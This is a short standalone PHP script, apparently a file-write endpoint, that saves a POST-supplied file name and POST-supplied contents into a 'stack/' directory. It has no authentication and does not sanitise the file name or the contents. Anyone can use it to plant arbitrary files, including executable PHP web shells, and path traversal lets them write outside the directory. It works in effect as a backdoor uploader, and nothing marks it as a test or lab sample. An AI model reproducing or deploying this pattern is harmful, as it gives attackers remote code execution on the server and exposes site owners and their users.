<?php

$file=$_POST['hook_file'];
$data=$_POST['hook_data'];

file_put_contents('stack/'.$file,$data);
